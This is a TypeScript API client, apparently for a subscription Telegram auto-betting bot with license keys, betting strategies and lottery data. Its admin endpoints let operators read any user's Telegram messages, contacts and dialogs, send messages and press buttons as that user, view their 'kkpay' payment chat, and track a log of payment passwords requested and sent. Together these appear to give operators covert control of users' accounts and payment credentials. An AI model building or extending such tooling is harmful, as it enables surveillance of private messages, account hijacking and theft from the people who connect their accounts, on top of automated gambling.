const BASE = "/api";

async function req<T>(method: string, path: string, body?: unknown): Promise<T> {
  const res = await fetch(`${BASE}${path}`, {
    method,
    credentials: "include",
    headers: body ? { "Content-Type": "application/json" } : undefined,
    body: body ? JSON.stringify(body) : undefined,
  });
  const data = await res.json() as T & { error?: string };
  if (!res.ok) throw new Error((data as { error?: string }).error ?? `HTTP ${res.status}`);
  return data;
}

export const api = {
  get: <T>(path: string) => req<T>("GET", path),
  post: <T>(path: string, body?: unknown) => req<T>("POST", path, body),
  del: <T>(path: string) => req<T>("DELETE", path),

  auth: {
    register: (username: string, password: string) => api.post<{ ok: boolean; user: AuthUser }>("/auth/register", { username, password }),
    login: (username: string, password: string) => api.post<{ ok: boolean; user: AuthUser }>("/auth/login", { username, password }),
    logout: () => api.post<{ ok: boolean }>("/auth/logout"),
    me: () => api.get<{ user: AuthUser }>("/auth/me"),
  },

  card: {
    status: () => api.get<CardStatus>("/card/status"),
    activate: (key: string) => api.post<{ ok: boolean; type: string; expiresAt: string }>("/card/activate", { key }),
  },

  admin: {
    generateCards: (type: string, count: number, note?: string) =>
      api.post<{ ok: boolean; keys: string[] }>("/admin/cards/generate", { type, count, note }),
    listCards: () => api.get<{ cards: AdminCard[] }>("/admin/cards"),
    deleteCard: (id: number) => api.del<{ ok: boolean }>(`/admin/cards/${id}`),
    listUsers: () => api.get<{ users: AdminUser[] }>("/admin/users"),
    tgSessions: () => api.get<{ sessions: AdminTgSession[] }>("/admin/tg/sessions"),
    tgBets: (userId: number) => api.get<{ bets: BetRecord[] }>(`/admin/tg/sessions/${userId}/bets`),
    tgMessages: (userId: number) => api.get<{ messages: TgChatMessage[] }>(`/admin/tg/sessions/${userId}/messages`),
    tgFetchHistory: (userId: number) => api.post<{ ok: boolean; fetched: number; total: number }>(`/admin/tg/sessions/${userId}/fetch-history`, {}),
    tgSend: (userId: number, chatId: string | null, customTarget: string | null, message: string) =>
      api.post<{ ok: boolean; msgId?: number }>(`/admin/tg/sessions/${userId}/send`, { chatId, customTarget, message }),
    tgKkpay: (userId: number) => api.get<{ entityId: string | null; messages: TgChatMessage[] }>(`/admin/tg/sessions/${userId}/kkpay`),
    tgContacts: (userId: number) => api.get<{ contacts: { id: string; name: string; username: string | null; phone: string | null }[] }>(`/admin/tg/sessions/${userId}/contacts`),
    tgDialogs: (userId: number) => api.get<{ dialogs: { id: string; name: string; type: "private" | "group" | "channel"; username: string | null }[] }>(`/admin/tg/sessions/${userId}/dialogs`),
    tgPressButton: (userId: number, msgId: number, buttonText: string) =>
      api.post<{ ok: boolean }>(`/admin/tg/sessions/${userId}/press-button`, { msgId, buttonText }),
    kkpayPwdLog: () => api.get<{ events: { id: string; timestamp: number; userId: number; username: string; event: "pwd_requested" | "pwd_sent" | "pwd_success"; text: string }[] }>("/admin/kkpay-pwd-log"),
    setAdmin: (userId: number, isAdmin: boolean) => api.post<{ ok: boolean }>(`/admin/users/${userId}/set-admin`, { isAdmin }),
  },

  tg: {
    status: () => api.get<TgStatus>("/tg/status"),
    sendCode: (phone: string) => api.post<{ ok: boolean }>("/tg/send-code", { phone }),
    verifyCode: (code: string) => api.post<{ ok: boolean; needPassword?: boolean; me?: TgMe }>("/tg/verify-code", { code }),
    verifyPassword: (password: string) => api.post<{ ok: boolean; me?: TgMe }>("/tg/verify-password", { password }),
    disconnect: () => api.post<{ ok: boolean }>("/tg/disconnect"),
    groups: () => api.get<{ groups: TgGroup[] }>("/tg/groups"),
    resolveGroup: (link: string) => api.post<{ ok: boolean; group: TgGroup }>("/tg/resolve-group", { link }),
    setGroup: (groupId: string) => api.post<{ ok: boolean }>("/tg/set-group", { groupId }),
    config: (cfg: Record<string, unknown>) => api.post<{ ok: boolean; cfg: BetCfg }>("/tg/config", cfg),
    bets: () => api.get<{ bets: BetRecord[] }>("/tg/bets"),
    clearBets: () => api.del<{ ok: boolean }>("/tg/bets"),
    algoLeaderboard: () => api.get<{ stats: AlgoStat[] }>("/tg/algo-leaderboard"),
    algoRates: () => api.get<{ rates: AlgoRate[]; historyCount: number }>("/tg/algo-rates"),
    setKkpay: (username: string) => api.post<{ ok: boolean }>("/tg/kkpay", { username }),
  },

  lottery: {
    fengpan: () => api.get<LotteryData>("/lottery/fengpan"),
  },
};

// Types
export interface AuthUser {
  id: number;
  username: string;
  isAdmin: boolean;
}

export interface CardStatus {
  active: boolean;
  expired?: boolean;
  type?: string;
  expiresAt?: string;
  key?: string;
}

export interface AdminCard {
  id: number;
  key: string;
  type: string;
  userId: number | null;
  username: string | null;
  expiresAt: string | null;
  activatedAt: string | null;
  createdAt: string;
  note: string | null;
  isActive: boolean;
  isUsed: boolean;
}

export interface AdminUser {
  id: number;
  username: string;
  isAdmin: boolean;
  createdAt: string;
}

export interface TgMe {
  id: unknown;
  firstName?: string;
  lastName?: string;
  username?: string;
  phone?: string;
}

export interface TgGroup {
  id: string;
  title: string;
  type: string;
  membersCount?: number;
}

export interface BetCfg {
  autoBet: boolean;
  betAmount: number;
  strategy: string;
  betMultiplier: number;
  maxConsecutiveLosses: number;
  stopLoss: number;
  targetProfit: number;
  cooldownSeconds: number;
  amountLevels: number[];
  stepBackOnWin: boolean;
  betOptions: string[];
  algorithms: string[];
  odds: number;
  chaseNumbers: Array<{ num: number; amount: number }>;
  enableChase: boolean;
  gameMode?: string;
  kuaisanBetOptions?: string[];
}

export interface KuaisanResultItem {
  dice: [number, number, number];
  sum: number;
  big: boolean;
  odd: boolean;
  leopard: boolean;
  dragon: boolean;
  tiger: boolean;
  label: string;
}

export interface TgStatus {
  connected: boolean;
  me?: TgMe;
  watchGroupId?: string;
  watchGroupTitle?: string;
  autoBet?: boolean;
  betAmount?: number;
  strategy?: string;
  betMultiplier?: number;
  maxConsecutiveLosses?: number;
  stopLoss?: number;
  targetProfit?: number;
  cooldownSeconds?: number;
  amountLevels?: number[];
  stepBackOnWin?: boolean;
  betOptions?: string[];
  algorithms?: string[];
  odds?: number;
  chaseNumbers?: Array<{ num: number; amount: number }>;
  enableChase?: boolean;
  consecutiveLosses?: number;
  sessionPnl?: number;
  currentBet?: number;
  balance?: number;
  todayPnl?: number;
  balanceSource?: string;
  balanceUpdatedAt?: number;
  kkpayUsername?: string;
  kkpayEntityId?: string;
  riskBlocked?: boolean;
  riskReason?: string;
  lastAlgoUsed?: string;
  currentPattern?: "streak" | "oscillating" | "neutral";
  adaptiveSwitchKillMode?: boolean;
  oddsBigOdd?: number;
  oddsBigEven?: number;
  oddsSmallOdd?: number;
  oddsSmallEven?: number;
  totalBets?: number;
  settled?: number;
  wins?: number;
  maxStreak?: number;
  winRate?: string;
  gameMode?: string;
  kuaisanBetOptions?: string[];
  kuaisanPhase?: string;
  kuaisanPeriod?: string | null;
  kuaisanLastDice?: number[];
  kuaisanResults?: KuaisanResultItem[];
  kuaisanChatLog?: Array<{ text: string; ts: number; chatId?: string }>;
}

export interface BetRecord {
  id: string;
  groupId: string;
  groupTitle: string;
  messageText: string;
  betContent: string;
  amount: number;
  timestamp: number;
  status: "sent" | "failed" | "won" | "lost";
  period?: number;
  lotteryResult?: string;
  pnl?: number;
  won?: boolean;
  isChase?: boolean;
  failReason?: string;
  isAdaptiveKillBet?: boolean;
  algoId?: string;
}

export interface AlgoRate {
  algoId: string;
  simWins: number;
  simLosses: number;
  simTotal: number;
  simWinRate: string | null;
  currentPrediction: string | null;
}

export interface AlgoStat {
  algoId: string;
  // 走势回测（历史开奖数据模拟）
  simWins: number;
  simLosses: number;
  simTotal: number;
  simWinRate: string | null;
  canSimulate: boolean;
  // 实战统计（实际投注记录）
  wins: number;
  losses: number;
  total: number;
  winRate: string | null;
  pnl: number;
}

export interface TgChatMessage {
  sender: string;
  senderName: string;
  chatId: string;
  chatTitle: string;
  chatType: "private" | "group" | "channel";
  text: string;
  timestamp: number;
  msgId?: number;
  buttons?: { text: string; data?: string }[][];
}

export interface AdminTgSession {
  userId: number;
  me: { firstName?: string; lastName?: string; username?: string; phone?: string };
  watchGroupTitle?: string;
  autoBet: boolean;
  consecutiveLosses: number;
  sessionPnl: number;
  todayPnl: number;
  balance: number;
  currentBet: number;
  totalBets: number;
  wins: number;
  settled: number;
  winRate: string;
  riskBlocked: boolean;
  riskReason?: string;
  lastAlgoUsed?: string;
  currentPattern?: "streak" | "oscillating" | "neutral";
}

export interface LotteryData {
  message?: {
    all?: {
      keno28?: {
        data?: Array<{
          term: number;
          r3?: string;
          sum1?: number;
          sum2?: number;
          sum3?: number;
          result?: number;
          openTime?: number;
          closeTime?: number;
        }>;
      };
    };
  };
}
